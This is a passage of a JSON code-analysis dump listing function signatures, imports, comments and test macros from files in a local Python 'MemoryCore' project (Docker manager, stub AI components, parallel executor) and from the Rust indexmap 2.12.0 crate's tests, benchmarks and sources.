          "def update_state(self, state: Dict):\n\"\"\"Update system state\"\"\"\ntry:\nstate_file = self.state_path / \"docker_state.json\"\ncurrent_state = {\n\"last_updated\": datetime.now().isoformat(),\n\"containers\": len(self.client.containers.list()),\n\"images\": len(self.client.images.list()),\n\"system_info\": self.client.info(),\n**state",
          "def stop(self):\n\"\"\"Stop the management system\"\"\"\nself.running = False\n\nasync def main():\nmanager = DockerManager()\ntry:\nawait manager.run()\nexcept KeyboardInterrupt:\nmanager.stop()"
        ],
        "class_defs": [
          "class DockerManager:"
        ],
        "imports": [
          "import os",
          "import sys",
          "import json",
          "import yaml",
          "import docker",
          "import asyncio",
          "import logging",
          "import subprocess",
          "from pathlib import Path",
          "from datetime import datetime",
          "from typing import Dict, List, Optional",
          "from password_manager import PasswordManager"
        ],
        "comments": [
          "# Create necessary directories",
          "# Setup logging",
          "# Load or create configuration",
          "# Initialize state",
          "# Create default configuration",
          "# Get credentials from password manager",
          "# Generate new credentials if needed",
          "# Test authentication",
          "# Calculate CPU usage",
          "# Calculate memory usage",
          "# Check thresholds",
          "# Remove old containers",
          "# Remove old images",
          "# Get image details",
          "# Pull latest image",
          "# Check registry authentication",
          "# Monitor resources",
          "# Clean up old resources",
          "# Check for updates",
          "# Update state",
          "# Wait for next interval"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 22,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/browser_checker/.memorycore/services/docker/manager.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def setup(self):\n\"\"\"Initialize the component\"\"\"\nif not self.initialized:\n# Create state file\nstate = {\n\"component\": \"Docker Management System\",\n\"status\": \"initialized\",\n\"timestamp\": datetime.now().isoformat()\n}\n",
          "def run(self):\n\"\"\"Main execution loop\"\"\"\nif self.initialized:\nprint(f\"Running Docker Management System\")\nreturn True\nreturn False\n\ndef main():\ncomponent = DockerManager()\nsuccess = component.run()",
          "def main():"
        ],
        "class_defs": [
          "class DockerManager:"
        ],
        "imports": [
          "import os",
          "import sys",
          "import json",
          "from pathlib import Path",
          "from datetime import datetime"
        ],
        "comments": [
          "# Create state file"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/browser_checker/.memorycore/services/external/calcareers.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def setup(self):\n\"\"\"Initialize the component\"\"\"\nif not self.initialized:\n# Create state file\nstate = {\n\"component\": \"CalCareers Integration System\",\n\"status\": \"initialized\",\n\"timestamp\": datetime.now().isoformat()\n}\n",
          "def run(self):\n\"\"\"Main execution loop\"\"\"\nif self.initialized:\nprint(f\"Running CalCareers Integration System\")\nreturn True\nreturn False\n\ndef main():\ncomponent = CalCareers()\nsuccess = component.run()",
          "def main():"
        ],
        "class_defs": [
          "class CalCareers:"
        ],
        "imports": [
          "import os",
          "import sys",
          "import json",
          "from pathlib import Path",
          "from datetime import datetime"
        ],
        "comments": [
          "# Create state file"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/browser_checker/.memorycore/core/acceleration/parallel_executor.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def _get_phase_components(self, phase: int) -> List[str]:\n\"\"\"Get components for a phase\"\"\"\ncomponents = {\n# Core Infrastructure (1-5)\n1: [\"core/security/password_manager.py\"],\n2: [\"services/docker/manager.py\"],\n3: [\"core/monitoring/monitor.py\"],\n4: [\"core/automation/controller.py\"],\n5: [\"core/integration/service_manager.py\"],\n"
        ],
        "class_defs": [
          "class ParallelExecutor:"
        ],
        "imports": [
          "import os",
          "import sys",
          "import yaml",
          "import json",
          "import asyncio",
          "import subprocess",
          "from pathlib import Path",
          "from datetime import datetime",
          "import concurrent.futures",
          "from typing import Dict, List, Any",
          "import multiprocessing"
        ],
        "comments": [
          "# Initialize phase queue",
          "# Create worker tasks",
          "# Run workers",
          "# Get next phase",
          "# Execute phase",
          "# Requeue failed phases",
          "# Mark task done",
          "# Check if all phases complete",
          "# Get phase components",
          "# Execute components in parallel",
          "# Wait for all components",
          "# Check if all succeeded",
          "# Core Infrastructure (1-5)",
          "# Intelligence Layer (6-10)",
          "# Advanced Automation (11-15)",
          "# Evolution Track (16-20)",
          "# Quantum Track (21-25)",
          "# Final Phase (26)",
          "# Calculate progress",
          "# Print status",
          "# Start monitoring in background",
          "# Execute all phases",
          "# Cancel monitoring"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 11,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/browser_checker/.memorycore/core/ai/consciousness_engine.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def setup(self):\n\"\"\"Initialize the component\"\"\"\nif not self.initialized:\n# Create state file\nstate = {\n\"component\": \"Consciousness Management System\",\n\"status\": \"initialized\",\n\"timestamp\": datetime.now().isoformat()\n}\n",
          "def run(self):\n\"\"\"Main execution loop\"\"\"\nif self.initialized:\nprint(f\"Running Consciousness Management System\")\nreturn True\nreturn False\n\ndef main():\ncomponent = ConsciousnessSystem()\nsuccess = component.run()",
          "def main():"
        ],
        "class_defs": [
          "class ConsciousnessSystem:"
        ],
        "imports": [
          "import os",
          "import sys",
          "import json",
          "from pathlib import Path",
          "from datetime import datetime"
        ],
        "comments": [
          "# Create state file"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/browser_checker/.memorycore/core/ai/decision_engine.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def setup(self):\n\"\"\"Initialize the component\"\"\"\nif not self.initialized:\n# Create state file\nstate = {\n\"component\": \"Decision Making Engine\",\n\"status\": \"initialized\",\n\"timestamp\": datetime.now().isoformat()\n}\n",
          "def run(self):\n\"\"\"Main execution loop\"\"\"\nif self.initialized:\nprint(f\"Running Decision Making Engine\")\nreturn True\nreturn False\n\ndef main():\ncomponent = DecisionEngine()\nsuccess = component.run()",
          "def main():"
        ],
        "class_defs": [
          "class DecisionEngine:"
        ],
        "imports": [
          "import os",
          "import sys",
          "import json",
          "from pathlib import Path",
          "from datetime import datetime"
        ],
        "comments": [
          "# Create state file"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/browser_checker/.memorycore/core/ai/integration_engine.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def setup(self):\n\"\"\"Initialize the component\"\"\"\nif not self.initialized:\n# Create state file\nstate = {\n\"component\": \"AI Integration System\",\n\"status\": \"initialized\",\n\"timestamp\": datetime.now().isoformat()\n}\n",
          "def run(self):\n\"\"\"Main execution loop\"\"\"\nif self.initialized:\nprint(f\"Running AI Integration System\")\nreturn True\nreturn False\n\ndef main():\ncomponent = AIIntegration()\nsuccess = component.run()",
          "def main():"
        ],
        "class_defs": [
          "class AIIntegration:"
        ],
        "imports": [
          "import os",
          "import sys",
          "import json",
          "from pathlib import Path",
          "from datetime import datetime"
        ],
        "comments": [
          "# Create state file"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      }
    ],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0",
    "name": "indexmap-2.12.0",
    "languages": [
      "Rust"
    ],
    "python_patterns": [],
    "rust_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0/tests/quick.rs",
        "function_defs": [
          "fn set<'a, T: 'a, I>(iter: I) -> HashSet<T>",
          "fn indexmap<'a, T: 'a, I>(iter: I) -> IndexMap<T, ()>",
          "fn $fn_name:ident($($arg_name:ident : $arg_ty:ty),*) -> $ret:ty {",
          "fn $fn_name() {",
          "fn prop($($arg_name: $arg_ty),*) -> $ret {",
          "fn contains(insert: Vec<u32>) -> bool {",
          "fn contains_not(insert: Vec<u8>, not: Vec<u8>) -> bool {",
          "fn insert_remove(insert: Vec<u8>, remove: Vec<u8>) -> bool {",
          "fn insertion_order(insert: Vec<u32>) -> bool {",
          "fn insert_sorted(insert: Vec<(u32, u32)>) -> bool {",
          "fn insert_sorted_by(insert: Vec<(u32, u32)>) -> bool {",
          "fn insert_sorted_by_key(insert: Vec<(i32, u32)>) -> bool {",
          "fn replace_index(insert: Vec<u8>, index: u8, new_key: u8) -> TestResult {",
          "fn vacant_replace_index(insert: Vec<u8>, index: u8, new_key: u8) -> TestResult {",
          "fn pop(insert: Vec<u8>) -> bool {",
          "fn with_cap(template: Vec<()>) -> bool {",
          "fn drain_full(insert: Vec<u8>) -> bool {",
          "fn drain_bounds(insert: Vec<u8>, range: (Bound<usize>, Bound<usize>)) -> TestResult {",
          "fn extract_if_odd(insert: Vec<u8>) -> bool {",
          "fn extract_if_odd_limit(insert: Vec<u8>, limit: usize) -> bool {",
          "fn shift_remove(insert: Vec<u8>, remove: Vec<u8>) -> bool {",
          "fn indexing(insert: Vec<u8>) -> bool {",
          "fn set_swap_indices(vec: Vec<u8>, a: u8, b: u8) -> TestResult {",
          "fn map_swap_indices(vec: Vec<u8>, from: u8, to: u8) -> TestResult {",
          "fn occupied_entry_swap_indices(vec: Vec<u8>, from: u8, to: u8) -> TestResult {",
          "fn indexed_entry_swap_indices(vec: Vec<u8>, from: u8, to: u8) -> TestResult {",
          "fn raw_occupied_entry_swap_indices(vec: Vec<u8>, from: u8, to: u8) -> TestResult {",
          "fn set_move_index(vec: Vec<u8>, from: u8, to: u8) -> TestResult {",
          "fn map_move_index(vec: Vec<u8>, from: u8, to: u8) -> TestResult {",
          "fn occupied_entry_move_index(vec: Vec<u8>, from: u8, to: u8) -> TestResult {",
          "fn indexed_entry_move_index(vec: Vec<u8>, from: u8, to: u8) -> TestResult {",
          "fn raw_occupied_entry_move_index(vec: Vec<u8>, from: u8, to: u8) -> TestResult {",
          "fn occupied_entry_shift_insert(vec: Vec<u8>, i: u8) -> TestResult {",
          "fn raw_occupied_entry_shift_insert(vec: Vec<u8>, i: u8) -> TestResult {",
          "fn test_map_swap_indices<F>(vec: Vec<u8>, a: u8, b: u8, swap_indices: F) -> TestResult",
          "fn test_map_move_index<F>(vec: Vec<u8>, from: u8, to: u8, move_index: F) -> TestResult",
          "fn test_map_shift_insert<F>(vec: Vec<u8>, i: u8, shift_insert: F) -> TestResult",
          "fn arbitrary(g: &mut Gen) -> Self {",
          "fn do_ops<K, V, S>(ops: &[Op<K, V>], a: &mut IndexMap<K, V, S>, b: &mut HashMap<K, V>)",
          "fn assert_maps_equivalent<K, V>(a: &IndexMap<K, V>, b: &HashMap<K, V>) -> bool",
          "fn operations_i8(ops: Large<Vec<Op<i8, i8>>>) -> bool {",
          "fn operations_string(ops: Vec<Op<Alpha, i8>>) -> bool {",
          "fn keys_values(ops: Large<Vec<Op<i8, i8>>>) -> bool {",
          "fn keys_values_mut(ops: Large<Vec<Op<i8, i8>>>) -> bool {",
          "fn equality(ops1: Vec<Op<i8, i8>>, removes: Vec<usize>) -> bool {",
          "fn retain_ordered(keys: Large<Vec<i8>>, remove: Large<Vec<i8>>) -> () {",
          "fn sort_1(keyvals: Large<Vec<(i8, i8)>>) -> () {",
          "fn sort_2(keyvals: Large<Vec<(i8, i8)>>) -> () {",
          "fn sort_3(keyvals: Large<Vec<(i8, i8)>>) -> () {",
          "fn reverse(keyvals: Large<Vec<(i8, i8)>>) -> () {",
          "fn generate_answer(input: &Vec<(i8, i8)>) -> Vec<(i8, i8)> {",
          "fn assert_sorted_by_key<I, Key, X>(iterable: I, key: Key)",
          "fn deref(&self) -> &String {",
          "fn arbitrary(g: &mut Gen) -> Self {",
          "fn shrink(&self) -> Box<dyn Iterator<Item = Self>> {",
          "fn deref(&self) -> &T {",
          "fn arbitrary(g: &mut Gen) -> Self {",
          "fn shrink(&self) -> Box<dyn Iterator<Item = Self>> {"
        ],
        "struct_defs": [
          "struct Alpha(String);",
          "struct Large<T>(T);"
        ],
        "impl_blocks": [
          "impl Deref for Alpha {",
          "impl Arbitrary for Alpha {"
        ],
        "uses": [
          "use indexmap::{IndexMap, IndexSet};",
          "use itertools::Itertools;",
          "use quickcheck::Arbitrary;",
          "use quickcheck::Gen;",
          "use quickcheck::QuickCheck;",
          "use quickcheck::TestResult;",
          "use fnv::FnvHasher;",
          "use std::hash::{BuildHasher, BuildHasherDefault};",
          "use std::cmp::min;",
          "use std::collections::HashMap;",
          "use std::collections::HashSet;",
          "use std::fmt::Debug;",
          "use std::hash::Hash;",
          "use std::ops::Bound;",
          "use std::ops::Deref;",
          "use indexmap::map::Entry;",
          "use std::collections::hash_map::Entry as StdEntry;",
          "use indexmap::map::raw_entry_v1::{RawEntryApiV1, RawEntryMut};",
          "use indexmap::map::raw_entry_v1::{RawEntryApiV1, RawEntryMut};",
          "use indexmap::map::raw_entry_v1::{RawEntryApiV1, RawEntryMut};",
          "use crate::Op::*;"
        ],
        "macros": [
          "if cfg!(miri) {",
          "assert!(old_key == new_key || !map.contains_key(&old_key));",
          "assert_eq!(key, new_key);",
          "assert_eq!(map.get_index_of(&new_key), Some(index));",
          "assert_eq!(map.get_index(index), Some((&new_key, &())));",
          "assert_eq!(old_key, replaced_key);",
          "assert_eq!(*entry.key(), new_key);",
          "assert!(!map.contains_key(&old_key));",
          "assert_eq!(map.get_index_of(&new_key), Some(index));",
          "assert_eq!(map.get_index(index), Some((&new_key, &())));",
          "println!(\"wish: {}, got: {} (diff: {})\", cap, map.capacity(), map.capacity() as ",
          "assert!(map.keys().eq(&keys));",
          "assert!(keys.iter().all(|key| map.contains_key(key)));",
          "assert_eq!(Some(&key), iter.next());",
          "assert_eq!(map.len(), set.len());",
          "assert_eq!(map.get_index(i), Some((&key, &key)));",
          "assert_eq!(set.get_index(i), Some(&key));",
          "assert_eq!(map[i], key);",
          "assert_eq!(set[i], key);",
          "assert!(set.iter().eq(vec.iter()));",
          "assert!(vec.iter().enumerate().all(|(i, x)| {",
          "_ => unreachable!(),",
          "_ => unreachable!(),",
          "assert!(set.iter().eq(vec.iter()));",
          "assert!(vec.iter().enumerate().all(|(i, x)| {",
          "_ => unreachable!(),",
          "_ => unreachable!(),",
          "_ => unreachable!(),",
          "_ => unreachable!(),",
          "assert!(map.keys().eq(vec.iter()));",
          "assert!(vec",
          "assert!(map.keys().eq(vec.iter()));",
          "assert!(vec",
          "assert_eq!(x, last);",
          "assert!(map.keys().eq(vec.iter()));",
          "assert!(vec",
          "//println!(\"{:?}\", a);",
          "assert_eq!(a.len(), b.len());",
          "assert_eq!(a.iter().next().is_some(), b.iter().next().is_some());",
          "assert!(b.contains_key(key), \"b does not contain {:?}\", key);",
          "assert!(a.get(key).is_some(), \"a does not contain {:?}\", key);",
          "assert_eq!(a[key], b[key]);",
          "assert_eq!(&map[k], v);",
          "assert!(!visit.contains_key(k));",
          "assert_eq!(visit.len(), reference.len());",
          "assert_eq!(&reference[k], v);",
          "assert!(!visit.contains_key(k));",
          "assert_eq!(visit.len(), reference.len());",
          "assert_eq!(map == map2, reference == reference2);",
          "assert_eq!(map.len(), answer.len());",
          "assert!(map.contains_key(key));",
          "assert_eq!(map[&key], val);",
          "assert_eq!(answer, mapv);",
          "assert_eq!(map[&key], val);",
          "assert_eq!(answer, mapv);",
          "assert_eq!(input, sorted);"
        ],
        "derives": [
          "#[derive(Copy, Clone, Debug)]",
          "#[derive(Clone, Debug, Hash, PartialEq, Eq)]",
          "#[derive(Clone, Debug)]"
        ],
        "error_handling": 23
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0/tests/macros_full_path.rs",
        "function_defs": [
          "fn test_create_map() {",
          "fn test_create_set() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0/tests/equivalent_trait.rs",
        "function_defs": [
          "fn eq(&self, rhs: &(A, B)) -> bool {",
          "fn equivalent(&self, other: &X) -> bool {",
          "fn test_lookup() {",
          "fn test_string_str() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use indexmap::indexmap;",
          "use indexmap::Equivalent;",
          "use std::hash::Hash;"
        ],
        "macros": [
          "assert!(map.contains_key(&Pair(\"a\", \"b\")));",
          "assert!(!map.contains_key(&Pair(\"b\", \"a\")));",
          "assert!(map.contains_key(\"a\"));",
          "assert!(!map.contains_key(\"z\"));",
          "assert_eq!(map.swap_remove(\"b\"), Some(2));"
        ],
        "derives": [
          "#[derive(Debug, Hash)]"
        ],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0/tests/tests.rs",
        "function_defs": [
          "fn test_sort() {",
          "fn test_sort_set() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use indexmap::{indexmap, indexset};"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0/benches/faststring.rs",
        "function_defs": [
          "fn small_rng() -> fastrand::Rng {",
          "fn hash<H: Hasher>(&self, h: &mut H) {",
          "fn from(s: &'a S) -> Self {",
          "fn hash<H: Hasher>(&self, h: &mut H) {",
          "fn borrow(&self) -> &OneShot<str> {",
          "fn deref(&self) -> &T {",
          "fn shuffled_keys<I>(iter: I) -> Vec<I::Item>",
          "fn insert_hashmap_string_10_000(b: &mut Bencher) {",
          "fn insert_hashmap_string_oneshot_10_000(b: &mut Bencher) {",
          "fn insert_indexmap_string_10_000(b: &mut Bencher) {",
          "fn lookup_hashmap_10_000_exist_string(b: &mut Bencher) {",
          "fn lookup_hashmap_10_000_exist_string_oneshot(b: &mut Bencher) {",
          "fn lookup_indexmap_10_000_exist_string(b: &mut Bencher) {",
          "fn lookup_indexmap_10_000_exist_string_oneshot(b: &mut Bencher) {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Hash for OneShot<str> {",
          "impl Hash for OneShot<String> {",
          "impl Borrow<OneShot<str>> for OneShot<String> {"
        ],
        "uses": [
          "use test::Bencher;",
          "use indexmap::IndexMap;",
          "use std::collections::HashMap;",
          "use std::hash::{Hash, Hasher};",
          "use std::borrow::Borrow;",
          "use std::ops::Deref;"
        ],
        "macros": [],
        "derives": [
          "#[derive(PartialEq, Eq, Copy, Clone)]"
        ],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0/benches/bench.rs",
        "function_defs": [
          "fn small_rng() -> fastrand::Rng {",
          "fn new_hashmap(b: &mut Bencher) {",
          "fn new_indexmap(b: &mut Bencher) {",
          "fn with_capacity_10e5_hashmap(b: &mut Bencher) {",
          "fn with_capacity_10e5_indexmap(b: &mut Bencher) {",
          "fn insert_hashmap_10_000(b: &mut Bencher) {",
          "fn insert_indexmap_10_000(b: &mut Bencher) {",
          "fn insert_hashmap_string_10_000(b: &mut Bencher) {",
          "fn insert_indexmap_string_10_000(b: &mut Bencher) {",
          "fn insert_hashmap_str_10_000(b: &mut Bencher) {",
          "fn insert_indexmap_str_10_000(b: &mut Bencher) {",
          "fn insert_hashmap_int_bigvalue_10_000(b: &mut Bencher) {",
          "fn insert_indexmap_int_bigvalue_10_000(b: &mut Bencher) {",
          "fn insert_hashmap_100_000(b: &mut Bencher) {",
          "fn insert_indexmap_100_000(b: &mut Bencher) {",
          "fn insert_hashmap_150(b: &mut Bencher) {",
          "fn insert_indexmap_150(b: &mut Bencher) {",
          "fn entry_hashmap_150(b: &mut Bencher) {",
          "fn entry_indexmap_150(b: &mut Bencher) {",
          "fn iter_sum_hashmap_10_000(b: &mut Bencher) {",
          "fn iter_sum_indexmap_10_000(b: &mut Bencher) {",
          "fn iter_black_box_hashmap_10_000(b: &mut Bencher) {",
          "fn iter_black_box_indexmap_10_000(b: &mut Bencher) {",
          "fn shuffled_keys<I>(iter: I) -> Vec<I::Item>",
          "fn lookup_hashmap_10_000_exist(b: &mut Bencher) {",
          "fn lookup_hashmap_10_000_noexist(b: &mut Bencher) {",
          "fn lookup_indexmap_10_000_exist(b: &mut Bencher) {",
          "fn lookup_indexmap_10_000_noexist(b: &mut Bencher) {",
          "fn lookup_hashmap_100_000_multi(b: &mut Bencher) {",
          "fn lookup_indexmap_100_000_multi(b: &mut Bencher) {",
          "fn lookup_hashmap_100_000_inorder_multi(b: &mut Bencher) {",
          "fn lookup_indexmap_100_000_inorder_multi(b: &mut Bencher) {",
          "fn lookup_hashmap_100_000_single(b: &mut Bencher) {",
          "fn lookup_indexmap_100_000_single(b: &mut Bencher) {",
          "fn grow_fnv_hashmap_100_000(b: &mut Bencher) {",
          "fn grow_fnv_indexmap_100_000(b: &mut Bencher) {",
          "fn hashmap_merge_simple(b: &mut Bencher) {",
          "fn hashmap_merge_shuffle(b: &mut Bencher) {",
          "fn indexmap_merge_simple(b: &mut Bencher) {",
          "fn indexmap_merge_shuffle(b: &mut Bencher) {",
          "fn swap_remove_indexmap_100_000(b: &mut Bencher) {",
          "fn shift_remove_indexmap_100_000_few(b: &mut Bencher) {",
          "fn shift_remove_indexmap_2_000_full(b: &mut Bencher) {",
          "fn pop_indexmap_100_000(b: &mut Bencher) {",
          "fn few_retain_indexmap_100_000(b: &mut Bencher) {",
          "fn few_retain_hashmap_100_000(b: &mut Bencher) {",
          "fn half_retain_indexmap_100_000(b: &mut Bencher) {",
          "fn half_retain_hashmap_100_000(b: &mut Bencher) {",
          "fn many_retain_indexmap_100_000(b: &mut Bencher) {",
          "fn many_retain_hashmap_100_000(b: &mut Bencher) {",
          "fn indexmap_sort_s(b: &mut Bencher) {",
          "fn indexmap_simple_sort_s(b: &mut Bencher) {",
          "fn indexmap_sort_u32(b: &mut Bencher) {",
          "fn indexmap_simple_sort_u32(b: &mut Bencher) {",
          "fn indexmap_clone_for_sort_s(b: &mut Bencher) {",
          "fn indexmap_clone_for_sort_u32(b: &mut Bencher) {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use fnv::FnvHasher;",
          "use std::hash::BuildHasherDefault;",
          "use std::hash::Hash;",
          "use std::hint::black_box;",
          "use std::sync::LazyLock;",
          "use test::Bencher;",
          "use indexmap::IndexMap;",
          "use std::collections::HashMap;"
        ],
        "macros": [
          "assert_eq!(map.len(), len);",
          "assert_eq!(map.len(), len);",
          "assert_eq!(map.len(), len);",
          "assert_eq!(map.len(), len);",
          "map.insert(format!(\"{:^16x}\", &key), String::new());",
          "assert_eq!(map.len(), 0);",
          "assert_eq!(map.len(), IMAP_100K.len() - keys.len());",
          "assert_eq!(map.len(), 0);",
          "assert_eq!(map.len(), 0);"
        ],
        "derives": [],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0/src/arbitrary.rs",
        "function_defs": [
          "fn arbitrary(u: &mut Unstructured<'a>) -> Result<Self> {",
          "fn arbitrary_take_rest(u: Unstructured<'a>) -> Result<Self> {",
          "fn arbitrary(u: &mut Unstructured<'a>) -> Result<Self> {",
          "fn arbitrary_take_rest(u: Unstructured<'a>) -> Result<Self> {",
          "fn arbitrary(g: &mut Gen) -> Self {",
          "fn shrink(&self) -> Box<dyn Iterator<Item = Self>> {",
          "fn arbitrary(g: &mut Gen) -> Self {",
          "fn shrink(&self) -> Box<dyn Iterator<Item = Self>> {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::{IndexMap, IndexSet};",
          "use arbitrary::{Arbitrary, Result, Unstructured};",
          "use core::hash::{BuildHasher, Hash};",
          "use crate::{IndexMap, IndexSet};",
          "use alloc::boxed::Box;",
          "use alloc::vec::Vec;",
          "use core::hash::{BuildHasher, Hash};",
          "use quickcheck::{Arbitrary, Gen};"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 4
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0/src/sval.rs",
        "function_defs": [
          "fn stream<'sval, ST: Stream<'sval> + ?Sized>(&'sval self, stream: &mut ST) -> sval::Result {",
          "fn stream<'sval, ST: Stream<'sval> + ?Sized>(&'sval self, stream: &mut ST) -> sval::Result {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::{IndexMap, IndexSet};",
          "use sval::{Stream, Value};"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 13
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0/src/util.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use core::ops::{Bound, Range, RangeBounds};"
        ],
        "macros": [
          "panic!(\"range start index {i} out of range for slice of length {len}\")",
          "panic!(\"range end index {i} out of range for slice of length {len}\")",
          "panic!("
        ],
        "derives": [],
        "error_handling": 5
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0/src/serde.rs",
        "function_defs": [
          "fn serialize<T>(&self, serializer: T) -> Result<T::Ok, T::Error>",
          "fn expecting(&self, formatter: &mut Formatter<'_>) -> fmt::Result {",
          "fn visit_map<A>(self, mut map: A) -> Result<Self::Value, A::Error>",
          "fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>",
          "fn into_deserializer(self) -> Self::Deserializer {",
          "fn serialize<Se>(&self, serializer: Se) -> Result<Se::Ok, Se::Error>",
          "fn expecting(&self, formatter: &mut Formatter<'_>) -> fmt::Result {",
          "fn visit_seq<A>(self, mut seq: A) -> Result<Self::Value, A::Error>",
          "fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>",
          "fn into_deserializer(self) -> Self::Deserializer {"
        ],
        "struct_defs": [
          "struct IndexMapVisitor<K, V, S>(PhantomData<(K, V, S)>);",
          "struct IndexSetVisitor<T, S>(PhantomData<(T, S)>);"
        ],
        "impl_blocks": [],
        "uses": [
          "use serde_core::de::value::{MapDeserializer, SeqDeserializer};",
          "use serde_core::de::{",
          "use serde_core::ser::{Serialize, Serializer};",
          "use core::fmt::{self, Formatter};",
          "use core::hash::{BuildHasher, Hash};",
          "use core::marker::PhantomData;",
          "use crate::{Bucket, IndexMap, IndexSet};"
        ],
        "macros": [
          "write!(formatter, \"a map\")",
          "write!(formatter, \"a set\")"
        ],
        "derives": [],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0/src/lib.rs",
        "function_defs": [
          "fn get(self) -> u64 {",
          "fn clone(&self) -> Self {",
          "fn clone_from(&mut self, other: &Self) {",
          "fn key_ref(&self) -> &K {",
          "fn value_ref(&self) -> &V {",
          "fn value_mut(&mut self) -> &mut V {",
          "fn key(self) -> K {",
          "fn value(self) -> V {",
          "fn key_value(self) -> (K, V) {",
          "fn refs(&self) -> (&K, &V) {",
          "fn ref_mut(&mut self) -> (&K, &mut V) {",
          "fn muts(&mut self) -> (&mut K, &mut V) {",
          "fn from_alloc(error: alloc::collections::TryReserveError) -> Self {",
          "fn from_hashbrown(error: hashbrown::TryReserveError) -> Self {",
          "fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {",
          "fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {"
        ],
        "struct_defs": [
          "struct HashValue(usize);",
          "struct Bucket<K, V> {"
        ],
        "impl_blocks": [
          "impl HashValue {",
          "impl TryReserveError {",
          "impl core::fmt::Display for TryReserveError {",
          "impl core::error::Error for TryReserveError {}",
          "impl core::fmt::Display for GetDisjointMutError {",
          "impl core::error::Error for GetDisjointMutError {}"
        ],
        "uses": [],
        "macros": [
          "//! assert_eq!(std, fnv);"
        ],
        "derives": [
          "#[derive(Clone, Copy, Debug, PartialEq)]",
          "#[derive(Copy, Debug)]",
          "#[derive(Clone, PartialEq, Eq, Debug)]",
          "#[derive(Clone, PartialEq, Eq, Debug)]",
          "#[derive(Debug, Clone, PartialEq, Eq)]"
        ],
        "error_handling": 4
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.12.0/src/borsh.rs",
        "function_defs": [
          "fn serialize<W: Write>(&self, writer: &mut W) -> Result<()> {",
          "fn deserialize_reader<R: Read>(reader: &mut R) -> Result<Self> {",
          "fn serialize<W: Write>(&self, writer: &mut W) -> Result<()> {",
          "fn deserialize_reader<R: Read>(reader: &mut R) -> Result<Self> {",
          "fn check_zst<T>() -> Result<()> {",
